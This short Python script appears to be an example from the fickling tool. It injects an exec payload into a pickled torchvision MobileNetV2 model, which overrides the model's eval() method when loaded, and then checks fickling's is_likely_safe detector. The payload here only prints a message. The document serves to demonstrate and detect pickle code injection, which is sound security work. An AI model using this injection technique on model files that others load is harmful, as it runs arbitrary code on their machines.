import pickle

import torchvision.models as models

from fickling.fickle import Pickled

# Use fickling to override a custom method (.eval())

model = models.mobilenet_v2()

print("Running eval()")
model.eval()
print("Finished running eval()\n\n")

payload = '''exec("""type(model).eval = eval('lambda model: print("!!!!We can run whatever custom Python code we want to!!!!")')""")''' #noqa
fickled_model = Pickled.load(pickle.dumps(model))

fickled_model.insert_python_exec(payload)
model = pickle.loads(fickled_model.dumps())

print("Running eval()")
model.eval()
print("Finished running eval()")

print("\n\nIs this is_likely_safe?")
safety = fickled_model.is_likely_safe
if safety is False:
    print("❌")
else:
    print("✅")
